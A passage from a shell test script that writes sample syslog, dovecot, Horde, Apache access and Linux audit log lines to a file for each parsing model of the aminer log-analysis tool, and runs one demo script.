            echo "Mar  4 06:29:05 mail systemd[1]: Stopping Security Auditing Service..." >> $LOGFILE
            echo "Mar  4 06:29:05 mail systemd[1]: Stopped Security Auditing Service." >> $LOGFILE
            echo "Mar  5 06:25:35 mail systemd[1]: Reloading The Apache HTTP Server." >> $LOGFILE
            echo "Mar  5 06:25:35 mail systemd[1]: Reloaded The Apache HTTP Server." >> $LOGFILE
            echo "Feb 29 11:52:32 mail-2 systemd[1]: Mounting Arbitrary Executable File Formats File System..." >> $LOGFILE
            echo "Feb 29 11:52:32 mail-2 systemd[1]: Mounted Arbitrary Executable File Formats File System." >> $LOGFILE
            echo "Feb 29 13:56:59 mail-2 systemd[1]: apt-daily.timer: Adding 6h 4min 46.743459s random time." >> $LOGFILE
            # missing model/service/systemd/service - no log found!
            echo "Feb 29 07:24:02 mail-0 kernel: [47678.309129]  [<ffffffff92e1e577>] ? ret_from_fork+0x57/0x70" >> $LOGFILE
            echo "Mar  5 06:29:07 mail augenrules[17378]: backlog_wait_time 0" >> $LOGFILE
            echo "Mar  5 06:29:07 mail auditd[17377]: dispatch error reporting limit reached - ending report notification." >> $LOGFILE
            echo "Mar  5 06:29:07 mail auditd: audit log is not writable by owner" >> $LOGFILE
            echo "Mar  4 06:29:05 mail audispd: No plugins found, exiting" >> $LOGFILE
            echo 'Mar  3 06:29:01 mail liblogging-stdlog:  [origin software="rsyslogd" swVersion="8.24.0" x-pid="480" x-info="http://www.rsyslog.com"] rsyslogd was HUPed' >> $LOGFILE
            echo "Mar  1 09:25:16 mail freshclam[22090]: Sun Mar  1 09:25:16 2020 -> bytecode.cvd is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)" >> $LOGFILE
            echo "Mar  1 07:26:09 mail dhclient[418]: DHCPREQUEST of 192.168.10.21 on eth0 to 192.168.10.2 port 67" >> $LOGFILE
            echo "Mar  1 00:59:38 mail-2 dhclient[387]: DHCPACK of 192.168.10.21 from 192.168.10.2" >> $LOGFILE
            echo "Feb 29 21:12:42 mail-2 dhclient[418]: bound to 192.168.10.21 -- renewal in 36807 seconds." >> $LOGFILE
            ;;
        SyslogParsingModelAIT-LDSv2)
            echo "Feb 29 00:01:41 mail-0 dovecot: imap(kelsey): Logged out in=79 out=875" > $LOGFILE
            echo "Mar  1 06:25:38 mail dovecot: imap(lino): Error: Failed to autocreate mailbox INBOX: Internal error occurred. Refer to server log for more information. [2020-03-01 06:25:38]" >> $LOGFILE
            echo "Feb 29 00:01:44 mail-0 dovecot: imap(della): Error: file_dotlock_create(/var/mail/della) failed: Permission denied (euid=1013(della) egid=1013(della) missing +w perm: /var/mail, we're not in group 8(mail), dir owned by 0:8 mode=0775) (set mail_privileged_group=mail)" >> $LOGFILE
            echo "Mar  1 06:25:41 mail dovecot: imap(idella): Error: Failed to autocreate mailbox INBOX: Internal error occurred. Refer to server log for more information. [2020-03-01 06:25:41]" >> $LOGFILE
            echo "Mar  4 14:14:36 mail dovecot: imap-login: Disconnected (auth failed, 2 attempts in 12 secs): user=<violet>, method=PLAIN, rip=127.0.0.1, lip=127.0.0.1, secured, session=<fEeWCQigUph/AAAB>" >> $LOGFILE
            echo "Mar  4 18:43:05 mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=<>, rip=192.168.10.185, lip=192.168.10.177, session=<cjd4ygugaJTAqAq5>" >> $LOGFILE
            echo "Mar  4 13:51:48 mail dovecot: imap-login: Disconnected (disconnected before auth was ready, waited 0 secs): user=<>, rip=192.168.10.18, lip=192.168.10.21, session=<+KO9uAeg4sPAqAoS>" >> $LOGFILE
            echo "Mar  4 18:43:59 mail dovecot: imap-login: Login: user=<sadye>, method=PLAIN, rip=127.0.0.1, lip=127.0.0.1, mpid=11475, secured, session=<8ZitzQugnrh/AAAB>" >> $LOGFILE
            echo "Feb 29 11:39:45 mail-0 dovecot: imap-login: Error: anvil: Anvil queries timed out after 5 secs - aborting queries" >> $LOGFILE
            echo "Feb 29 09:15:59 mail-1 dovecot: imap-login: Warning: Auth process not responding, delayed sending initial response (greeting): user=<>, rip=127.0.0.1, lip=127.0.0.1, secured, session=<dVUEZ7OfnLl/AAAB>" >> $LOGFILE
            echo "Feb 29 11:39:35 mail-2 dovecot: auth: Error: auth worker: Aborted PASSV request for marjory: Worker process died unexpectedly" >> $LOGFILE
            echo "Feb 29 11:39:35 mail-2 dovecot: auth-worker(2233): Fatal: Error reading configuration: Timeout reading config from /var/run/dovecot/config" >> $LOGFILE
            echo "Feb 29 11:39:35 mail-2 dovecot: master: Error: service(auth-worker): command startup failed, throttling for 2 secs" >> $LOGFILE
            echo 'Feb 29 11:39:46 mail-2 HORDE: [imp] Login success for marjory (192.168.10.18) to {imap://localhost/} [pid 1764 on line 156 of "/var/www/mail.insect.com/imp/lib/Auth.php"]' >> $LOGFILE
            echo 'Feb 29 17:18:23 mail-2 HORDE: [imp] Message sent to marcelle@mail.insect.com, merlene@mail.insect.com from les (192.168.10.18) [pid 9596 on line 970 of "/var/www/mail.insect.com/imp/lib/Compose.php"]' >> $LOGFILE
            echo 'Feb 29 20:01:48 mail-2 HORDE: [imp] FAILED LOGIN for violet (192.168.10.18) to {imap://localhost/} [pid 14794 on line 156 of "/var/www/mail.insect.com/imp/lib/Auth.php"]' >> $LOGFILE
            echo 'Mar  1 06:25:38 mail HORDE: [imp] [status] Could not open mailbox "INBOX". [pid 999 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOGFILE
            echo 'Mar  1 06:27:56 mail HORDE: [imp] [getSyncToken] IMAP error reported by server. [pid 1127 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOGFILE
            echo 'Feb 29 12:12:54 mail-2 HORDE: [horde] Login success for dorie to horde (192.168.10.18) [pid 2272 on line 163 of "/var/www/mail.insect.com/login.php"]' >> $LOGFILE
            echo 'Feb 29 12:13:00 mail-2 HORDE: [horde] User marjory logged out of Horde (192.168.10.18) [pid 2988 on line 106 of "/var/www/mail.insect.com/login.php"]' >> $LOGFILE
            echo 'Feb 29 17:07:07 mail-2 HORDE: [horde] FAILED LOGIN for marcelle to horde (192.168.10.98) [pid 8517 on line 198 of "/var/www/mail.insect.com/login.php"]' >> $LOGFILE
            echo 'Mar  1 18:22:40 mail HORDE: [imp] [login] Authentication failed. [pid 12890 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOGFILE
            echo 'Mar  4 18:55:05 mail HORDE: [turba] PHP ERROR: finfo_file(): Empty filename or path [pid 11642 on line 166 of "/usr/share/php/Horde/Mime/Magic.php"]' >> $LOGFILE
            echo 'Mar  4 18:50:51 mail HORDE: [horde] PHP ERROR: Cannot modify header information - headers already sent [pid 11019 on line 0 of "Unknown"]' >> $LOGFILE
            echo 'Mar  4 18:01:23 mail HORDE: Guest user is not authorized for Horde (Host: 192.168.10.81). [pid 4815 on line 324 of "/usr/share/php/Horde/Registry.php"]' >> $LOGFILE
            echo 'Mar  4 18:10:08 mail HORDE: PHP ERROR: rawurlencode() expects parameter 1 to be string, array given [pid 6556 on line 302 of "/usr/share/php/Horde/Url.php"]' >> $LOGFILE
            # missing model/service/horde/horde/free_msg - no log found!
            echo "Feb 29 12:39:02 mail-0 CRON[11260]: (root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi)" >> $LOGFILE
            echo "Feb 29 06:25:01 mail-1 CRON[27486]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOGFILE
            echo "Feb 29 15:42:36 mail-1 auth: pam_unix(dovecot:auth): authentication failure; logname= uid=0 euid=0 tty=dovecot ruser=marcelino rhost=127.0.0.1  user=marcelino" >> $LOGFILE
            echo "Mar  1 03:09:18 mail-0 systemd[1]: Starting Clean php session files..." >> $LOGFILE
            echo "Mar  1 03:09:19 mail-0 systemd[1]: Started Clean php session files." >> $LOGFILE
            echo "Mar  1 18:26:18 mail systemd[1]: Starting Cleanup of Temporary Directories..." >> $LOGFILE
            echo "Mar  1 18:26:18 mail systemd[1]: Started Cleanup of Temporary Directories." >> $LOGFILE
            echo "Mar  2 06:37:52 mail systemd[1]: Starting Daily apt upgrade and clean activities..." >> $LOGFILE
            echo "Mar  2 06:37:53 mail systemd[1]: Started Daily apt upgrade and clean activities." >> $LOGFILE
            echo "Mar  2 12:30:18 mail systemd[1]: Starting Daily apt download activities..." >> $LOGFILE
            echo "Mar  2 12:30:19 mail systemd[1]: Started Daily apt download activities." >> $LOGFILE
            echo "Mar  3 06:29:00 mail systemd[1]: Starting Security Auditing Service..." >> $LOGFILE
            echo "Mar  3 06:29:00 mail systemd[1]: Started Security Auditing Service." >> $LOGFILE
            echo "Mar  4 06:29:05 mail systemd[1]: Stopping Security Auditing Service..." >> $LOGFILE
            echo "Mar  4 06:29:05 mail systemd[1]: Stopped Security Auditing Service." >> $LOGFILE
            echo "Mar  5 06:25:35 mail systemd[1]: Reloading The Apache HTTP Server." >> $LOGFILE
            echo "Mar  5 06:25:35 mail systemd[1]: Reloaded The Apache HTTP Server." >> $LOGFILE
            echo "Feb 29 11:52:32 mail-2 systemd[1]: Mounting Arbitrary Executable File Formats File System..." >> $LOGFILE
            echo "Feb 29 11:52:32 mail-2 systemd[1]: Mounted Arbitrary Executable File Formats File System." >> $LOGFILE
            echo "Feb 29 13:56:59 mail-2 systemd[1]: apt-daily.timer: Adding 6h 4min 46.743459s random time." >> $LOGFILE
            # missing model/service/systemd/service - no log found!
            echo "Feb 29 07:24:02 mail-0 kernel: [47678.309129]  [<ffffffff92e1e577>] ? ret_from_fork+0x57/0x70" >> $LOGFILE
            echo "Mar  5 06:29:07 mail augenrules[17378]: backlog_wait_time 0" >> $LOGFILE
            echo "Mar  5 06:29:07 mail auditd[17377]: dispatch error reporting limit reached - ending report notification." >> $LOGFILE
            echo "Mar  5 06:29:07 mail auditd: audit log is not writable by owner" >> $LOGFILE
            echo "Mar  4 06:29:05 mail audispd: No plugins found, exiting" >> $LOGFILE
            echo 'Mar  3 06:29:01 mail liblogging-stdlog:  [origin software="rsyslogd" swVersion="8.24.0" x-pid="480" x-info="http://www.rsyslog.com"] rsyslogd was HUPed' >> $LOGFILE
            echo "Mar  1 09:25:16 mail freshclam[22090]: Sun Mar  1 09:25:16 2020 -> bytecode.cvd is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)" >> $LOGFILE
            echo "Mar  1 07:26:09 mail dhclient[418]: DHCPREQUEST of 192.168.10.21 on eth0 to 192.168.10.2 port 67" >> $LOGFILE
            echo "Mar  1 00:59:38 mail-2 dhclient[387]: DHCPACK of 192.168.10.21 from 192.168.10.2" >> $LOGFILE
            echo "Feb 29 21:12:42 mail-2 dhclient[418]: bound to 192.168.10.21 -- renewal in 36807 seconds." >> $LOGFILE
            ;;
        AminerParsingModel)
            sudo cp ./demo/aminer/jsonConverterHandler-demo-config.py /tmp/demo-config.py
            sudo ./demo/aminer/aminerDemo.sh > $LOGFILE
            sed -i -e 1,2d $LOGFILE
            sed -i -e "/Generating data for the LinearNumericBinDefinition histogram report../d" $LOGFILE
            sed -i -e "/Generating data for the ModuloTimeBinDefinition histogram report../d" $LOGFILE
            sed -i "/^CPU Temp: /d" $LOGFILE
            sed -i "/^first$/d" $LOGFILE
            sed -i "/^second$/d" $LOGFILE
            sed -i "/^third$/d" $LOGFILE
            sed -i "/^fourth$/d" $LOGFILE
            cat >> $CONFIG_PATH <<EOL
        json_format: True
EOL
            ;;
        ApacheAccessModel)
            echo '83.149.9.216 - - [17/May/2015:10:05:03 +0000] "GET /presentations/logstash-monitorama-2013/images/kibana-search.png HTTP/1.1" 200 203023 "http://semicomplete.com/presentations/logstash-monitorama-2013/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.77 Safari/537.36"' > $LOGFILE
            echo '127.0.0.1 - - [01/May/2020:21:44:53 +0200] "GET /phpmyadmin/sql.php?server=1&db=seconlineportaldb&table=CONTRACT&pos=0 HTTP/1.1" 200 5326 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"' >> $LOGFILE
            echo '127.0.0.1 - - [01/Apr/2020:09:19:23 +0200] "GET /phpmyadmin/themes/pmahomme/img/b_drop.png HTTP/1.1" 304 180 "http://localhost/phpmyadmin/phpmyadmin.css.php?nocache=6340393753ltr&server=1" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0"' >> $LOGFILE
            echo '111.222.333.123 HOME user1 [01/Feb/1998:01:08:39 -0800] "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"' >> $LOGFILE
            echo '::1 - - [31/Mar/2020:15:14:28 +0200] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1c (internal dummy connection)"' >> $LOGFILE
            echo '::1 - - [17/May/2015:10:05:03 +0000] "-" 200 203023' >> $LOGFILE
            echo '192.168.10.190 - - [29/Feb/2020:13:58:32 +0000] "GET /services/portal/ HTTP/1.1" 200 7499 "-" "-"' >> $LOGFILE
            echo '192.168.10.190 - - [29/Feb/2020:13:58:55 +0000] "POST /nag/task/save.php HTTP/1.1" 200 5220 "-" "-"' >> $LOGFILE
            echo 'www.google.com - - [29/Feb/2020:13:58:32 +0000] "GET /services/portal/ HTTP/1.1" 200 7499 "-" "-"' >> $LOGFILE
            ;;
        AudispdParsingModel)
            echo "audispd: type=ADD_GROUP msg=audit(1525173583.598:2104): pid=45406 uid=0 auid=0 ses=160 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=adding group acct=\"raman\" exe=\"/usr/sbin/useradd\" hostname=? addr=? terminal=pts/1 res=success'" > $LOGFILE
            echo "audispd: type=ADD_USER msg=audit(1525173583.670:2105): pid=45406 uid=0 auid=0 ses=160 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=adding user id=1003 exe=\"/usr/sbin/useradd\" hostname=? addr=? terminal=pts/1 res=success'" >> $LOGFILE
            echo "audispd: type=ADD_USER msg=audit(1525173583.677:2106): pid=45406 uid=0 auid=0 ses=160 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=adding home directory id=1003 exe=\"/usr/sbin/useradd\" hostname=? addr=? terminal=pts/1 res=success'" >> $LOGFILE
            echo 'type=ANOM_ABEND msg=audit(1459467717.181:189187): auid=4294967295 uid=977 gid=2010 ses=4294967295 subj=system_u:system_r:unconfined_service_t:s0 pid=40239 comm="radiusd" reason="memory violation" sig=11' >> $LOGFILE
            echo 'audispd: type=ANOM_ABEND msg=audit(1459370041.594:534): auid=10000 uid=0 gid=0 ses=6 subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 pid=3697 comm="sshd" reason="memory violation" sig=6' >> $LOGFILE
            echo "audispd: type=ANOM_ACCESS_FS msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=ANOM_ADD_ACCT msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=ANOM_AMTU_FAIL msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=ANOM_CRYPTO_FAIL msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=ANOM_DEL_ACCT msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=ANOM_EXEC msg=audit(1222174623.498:608): user pid=12965 uid=1 auid=2 ses=1 msg='op=PAM:unix_chkpwd acct=\"snap\" exe=\"/sbin/unix_chkpwd\" (hostname=?, addr=?, terminal=pts/0 res=failed)'" >> $LOGFILE
            echo "audispd: type=ANOM_LOGIN_ACCT msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=ANOM_LOGIN_FAILURES msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=ANOM_LOGIN_LOCATION msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=ANOM_LOGIN_SESSIONS msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=ANOM_LOGIN_TIME msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=ANOM_MAX_DAC msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=ANOM_MAX_MAC msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=ANOM_MK_EXEC msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=ANOM_MOD_ACCT msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=ANOM_PROMISCUOUS msg=audit(1390181243.575:738): dev=vethDvSeyL prom=256 old_prom=256 auid=4294967295 uid=0 gid=0 ses=4294967295" >> $LOGFILE
            echo "audispd: type=ANOM_RBAC_FAIL msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=ANOM_RBAC_INTEGRITY_FAIL msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=ANOM_ROOT_TRANS msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "type=AVC msg=audit(1226270358.848:238): avc:  denied  { write } for  pid=13349 comm=\"certwatch\" name=\"cache\" dev=dm-0 ino=218171 scontext=system_u:system_r:certwatch_t:s0 tcontext=system_u:object_r:var_t:s0 tclass=dir" >> $LOGFILE
            echo "audispd: type=AVC_PATH msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo 'audispd: type=BPRM_FCAPS msg=audit(1583242318.512:13886958): fver=17474 fp=33 fi=4294967295 fe=4294967295 old_pp=message old_pi="apache2" old_pe="/usr/bin/bash" new_pp=(null) new_pi=(null) new_pe=(null)' >> $LOGFILE
            echo "type=CAPSET msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=CHGRP_ID msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=CHUSER_ID msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=CONFIG_CHANGE msg=audit(1368831799.081:466947): auid=4294967295 ses=4294967295 op=\"remove rule\" path=\"/path/to/my/bin0\" key=(null) list=4 res=1" >> $LOGFILE
            echo "type=CONFIG_CHANGE msg=audit(1479097266.018:224): auid=500 ses=2 op=\"updated_rules\" path=\"/etc/passwd\" key=\"passwd_changes\" list=4 res=1" >> $LOGFILE
            echo "audispd: type=CRED_ACQ msg=audit(1450894634.199:1276): pid=1956 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=success'" >> $LOGFILE
            echo "audispd: type=CRED_DISP msg=audit(1450894635.111:1281): pid=1956 uid=0 auid=0 ses=213 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=success'" >> $LOGFILE
            echo "audispd: type=CRED_REFR msg=audit(1450894634.211:1279): pid=1958 uid=0 auid=0 ses=213 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=success'" >> $LOGFILE
            echo "audispd: type=CRYPTO_FAILURE_USER msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=CRYPTO_KEY_USER msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=CRYPTO_LOGIN msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=CRYPTO_LOGOUT msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=CRYPTO_PARAM_CHANGE_USER msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=CRYPTO_REPLAY_USER msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=CRYPTO_SESSION msg=audit(1150750972.008:3281471): user pid=1111 uid=0 auid=1111 msg='op=start direction=from-server cipher=aes128-ctr ksize=128 rport=40791 laddr=192.168.22.22 lport=22 id=4294967295 exe=\"/usr/sbin/sshd\" (hostname=?, addr=205.22.22.22, terminal=? res=success)'" >> $LOGFILE
            echo "audispd: type=CRYPTO_TEST_USER msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo 'audispd: type=CWD msg=audit(1450767416.248:3295858):  cwd="/"' >> $LOGFILE
            echo "audispd: type=DAC_CHECK msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=DAEMON_ABORT msg=audit(1339336882.189:9206): auditd error halt, auid=4294967295 pid=3095 res=failed" >> $LOGFILE
            echo "audispd: type=DAEMON_ACCEPT msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=DAEMON_CLOSE msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=DAEMON_CONFIG msg=audit(1264985324.554:4915): auditd error getting hup info - no change, sending auid=? pid=? subj=? res=failed" >> $LOGFILE
            echo "audispd: type=DAEMON_END msg=audit(1450876093.165:8729): auditd normal halt, sending auid=0 pid=1 subj= res=success" >> $LOGFILE
            echo "audispd: type=DAEMON_RESUME msg=audit(1300385209.456:8846): auditd resuming logging, sending auid=? pid=? subj=? res=success" >> $LOGFILE
            echo "audispd: type=DAEMON_ROTATE msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=DAEMON_START msg=audit(1450875964.131:8728): auditd start, ver=2.4 format=raw kernel=3.16.0-4-amd64 auid=4294967295 pid=1437 res=failed" >> $LOGFILE
            echo "audispd: type=DEL_GROUP msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=DEL_USER msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=EOE msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo 'audispd: type=EXECVE msg=audit(1582934957.620:917519): argc=10 a0="find" a1="/usr/lib/php" a2="-mindepth" a3="1" a4="-maxdepth" a5="1" a6="-regex" a7=".*[0-9]\.[0-9]" a8="-printf" a9="%f\n"' >> $LOGFILE
            echo "audispd: type=FD_PAIR msg=audit(1431919799.945:49458): fd0=5 fd1=6" >> $LOGFILE
            echo "audispd: type=FS_RELABEL msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=GRP_AUTH msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=INTEGRITY_DATA msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=INTEGRITY_HASH msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=INTEGRITY_METADATA msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=INTEGRITY_PCR msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=INTEGRITY_RULE msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=INTEGRITY_STATUS msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=IPC msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=IPC_SET_PERM msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=KERNEL msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=KERNEL_OTHER msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=LABEL_LEVEL_CHANGE msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=LABEL_OVERRIDE msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=LOGIN msg=audit(1450767601.778:3296208): login pid=15763 uid=0 old auid=4294967295 new auid=0 old ses=4294967295 new ses=2260" >> $LOGFILE
            echo "audispd: type=MAC_CIPSOV4_ADD msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MAC_CIPSOV4_DEL msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MAC_CONFIG_CHANGE msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MAC_IPSEC_EVENT msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MAC_MAP_ADD msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MAC_MAP_DEL msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MAC_POLICY_LOAD msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MAC_STATUS msg=audit(1336836093.835:406): enforcing=1 old_enforcing=0 auid=0 ses=2" >> $LOGFILE
            echo "audispd: type=MAC_UNLBL_ALLOW msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MAC_UNLBL_STCADD msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MAC_UNLBL_STCDEL msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MMAP msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MQ_GETSETATTR msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MQ_NOTIFY msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MQ_OPEN msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=MQ_SENDRECV msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=NETFILTER_CFG msg=audit(1479622038.866:2): table=filter family=2 entries=0" >> $LOGFILE
            echo "audispd: type=NETFILTER_PKT msg=audit(1487874761.386:228): mark=0xae8a2732 saddr=127.0.0.1 daddr=127.0.0.1 proto=17" >> $LOGFILE
            echo "audispd: type=NETFILTER_PKT msg=audit(1487874761.381:227): mark=0x223894b7 saddr=::1 daddr=::1 proto=58" >> $LOGFILE
            echo "audispd: type=OBJ_PID msg=audit(1279134100.434:193): opid=1968 oauid=-1 ouid=0 oses=-1 obj=<NULL> ocomm=\"sleep\"" >> $LOGFILE
            echo 'audispd: type=PATH msg=audit(1582934957.616:917512): item=0 name="/usr/bin/sort" inode=2883 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL' >> $LOGFILE
            echo 'audispd: type=PROCTITLE msg=audit(1582934957.616:917512): proctitle=736F7274002D726E' >> $LOGFILE
            echo "audispd: type=RESP_ACCT_LOCK msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=RESP_ACCT_LOCK_TIMED msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=RESP_ACCT_REMOTE msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=RESP_ACCT_UNLOCK_TIMED msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=RESP_ALERT msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=RESP_ANOMALY msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=RESP_EXEC msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=RESP_HALT msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=RESP_KILL_PROC msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=RESP_SEBOOL msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=RESP_SINGLE msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=RESP_TERM_ACCESS msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=RESP_TERM_LOCK msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=ROLE_ASSIGN msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=ROLE_MODIFY msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=ROLE_REMOVE msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=SELINUX_ERR msg=audit(1311948547.151:138): op=security_compute_av reason=bounds scontext=system_u:system_r:anon_webapp_t:s0-s0:c0,c100,c200 tcontext=system_u:object_r:security_t:s0 tclass=dir perms=ioctl,read,lock" >> $LOGFILE
            echo "audispd: type=SERVICE_START msg=audit(1450876900.115:30): pid=1 uid=0 auid=4294967295 ses=4294967295 msg=' comm=\"Serv-U\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'" >> $LOGFILE
            echo "audispd: type=SERVICE_STOP msg=audit(1450876900.115:31): pid=1 uid=0 auid=4294967295 ses=4294967295 msg=' comm=\"Serv-U\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'" >> $LOGFILE
            echo "audispd: type=SOCKADDR msg=audit(1582935421.377:947594): saddr=01002F6465762F6C6F6700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" >> $LOGFILE
            echo "audispd: type=SOCKETCALL msg=audit(1134642541.683:201): nargs=3 a0=10 a1=3 a2=9" >> $LOGFILE
            echo 'audispd: type=SYSCALL msg=audit(1582934957.616:917513): arch=c000003e syscall=2 success=yes exit=3 a0=7f5b904e4988 a1=80000 a2=1 a3=7f5b906ec518 items=1 ppid=25680 pid=25684 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="sort" exe="/usr/bin/sort" key=(null)' >> $LOGFILE
